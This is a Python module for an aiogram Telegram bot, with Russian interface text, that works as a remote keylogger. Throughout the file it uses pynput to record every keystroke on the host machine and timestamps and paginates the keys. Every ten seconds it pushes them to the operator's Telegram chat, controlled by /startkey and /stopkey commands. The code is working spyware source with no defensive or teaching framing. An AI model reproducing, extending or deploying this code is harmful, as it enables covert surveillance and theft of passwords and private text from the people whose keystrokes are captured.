from aiogram import Router, F
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from pynput import keyboard
import asyncio
from datetime import datetime

router = Router()

LINES_PER_PAGE = 5
UPDATE_INTERVAL = 10

keylog = {
    "active": False,
    "stop": False,
    "listener": None,
    "pages": [[]],
    "current_line": [],
    "msg_id": None,
    "chat_id": None,
    "page": 0,
}

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = f"[{key.name}]"
    keylog["current_line"].append(char)

def flush_line():
    if not keylog["current_line"]:
        return
    text = "".join(keylog["current_line"])
    time = datetime.now().strftime("%H:%M:%S")
    line = f"[{time}] {text}"
    keylog["current_line"] = []
    last_page = keylog["pages"][-1]
    last_page.append(line)
    if len(last_page) > LINES_PER_PAGE:
        keylog["pages"].append([])

def build_text(page_idx):
    pages = keylog["pages"]
    page = pages[page_idx] if page_idx < len(pages) else []
    text = f"🔑 <b>Кейлоггер — страница {page_idx + 1}/{len(pages)}</b>\n\n"
    if page:
        for line in page:
            text += f"<code>{line}</code>\n"
    else:
        text += "<i>(пусто)</i>"
    return text

def build_kb(page_idx):
    pages = keylog["pages"]
    total = len(pages)
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="⬅️", callback_data="kl_prev"),
        InlineKeyboardButton(text=f"{page_idx + 1}/{total}", callback_data="kl_noop"),
        InlineKeyboardButton(text="➡️", callback_data="kl_next"),
    ]])

@router.message(lambda m: m.text == "🔑 Кейлоггер")
async def keylogger_menu(message: Message):
    if keylog["active"]:
        await message.answer("⏹ Кейлоггер активен. /stopkey — остановить.")
    else:
        await message.answer("▶️ /startkey — начать запись нажатий.")

@router.message(lambda m: m.text == "/startkey")
async def start_keylog(message: Message, bot):
    if keylog["active"]:
        await message.answer("⚠️ Уже запущен")
        return
    keylog.update({
        "active": True,
        "stop": False,
        "pages": [[]],
        "current_line": [],
        "page": 0,
    })
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    keylog["listener"] = listener
    sent = await message.answer(
        build_text(0),
        parse_mode="HTML",
        reply_markup=build_kb(0)
    )
    keylog["msg_id"] = sent.message_id
    keylog["chat_id"] = message.chat.id

    async def update_loop():
        while not keylog["stop"]:
            await asyncio.sleep(UPDATE_INTERVAL)
            flush_line()
            try:
                await bot.edit_message_text(
                    chat_id=keylog["chat_id"],
                    message_id=keylog["msg_id"],
                    text=build_text(keylog["page"]),
                    parse_mode="HTML",
                    reply_markup=build_kb(keylog["page"])
                )
            except Exception:
                pass
        keylog["active"] = False

    asyncio.create_task(update_loop())
    await message.answer("🔑 Кейлоггер запущен. /stopkey — остановить.")

@router.message(lambda m: m.text == "/stopkey")
async def stop_keylog(message: Message, bot):
    if not keylog["active"]:
        await message.answer("❌ Кейлоггер не запущен")
        return
    keylog["stop"] = True
    keylog["listener"].stop()
    flush_line()
    try:
        await bot.edit_message_text(
            chat_id=keylog["chat_id"],
            message_id=keylog["msg_id"],
            text=build_text(keylog["page"]),
            parse_mode="HTML",
            reply_markup=build_kb(keylog["page"])
        )
    except Exception:
        pass
    await message.answer("⏹ Кейлоггер остановлен.")

@router.callback_query(lambda c: c.data in ["kl_prev", "kl_next", "kl_noop"])
async def paginate(callback: CallbackQuery, bot):
    if callback.data == "kl_noop":
        await callback.answer()
        return
    total = len(keylog["pages"])
    if callback.data == "kl_prev":
        keylog["page"] = max(0, keylog["page"] - 1)
    elif callback.data == "kl_next":
        keylog["page"] = min(total - 1, keylog["page"] + 1)
    try:
        await bot.edit_message_text(
            chat_id=keylog["chat_id"],
            message_id=keylog["msg_id"],
            text=build_text(keylog["page"]),
            parse_mode="HTML",
            reply_markup=build_kb(keylog["page"])
        )
    except Exception:
        pass
    await callback.answer()
